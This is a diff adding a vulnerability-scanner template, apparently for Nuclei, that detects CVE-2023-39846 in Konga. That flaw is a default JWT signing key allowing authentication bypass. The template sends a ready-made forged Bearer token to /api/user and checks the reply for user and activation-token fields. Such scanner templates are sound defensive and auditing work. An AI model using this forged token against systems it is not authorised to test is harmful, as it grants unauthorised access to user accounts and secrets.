@@ -1,0 +1,32 @@
+id: konga-default-jwt-key
+info:
+  name: Konga Default JWT Key
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2023-39846,auth-bypass
+  description: |
+    This template checks for the default JWT key vulnerability in Konga, allowing authentication bypass.
+
+http:
+  - raw:
+      - |
+        GET /api/user HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.MQ.Lu-KcR4aCeuT9hi1K474zV3s4VaopLDCcf4nZvH6DQo
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "json"
+      - type: word
+        part: body
+        words:
+          - "updatedUser"
+          - "activationToken"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
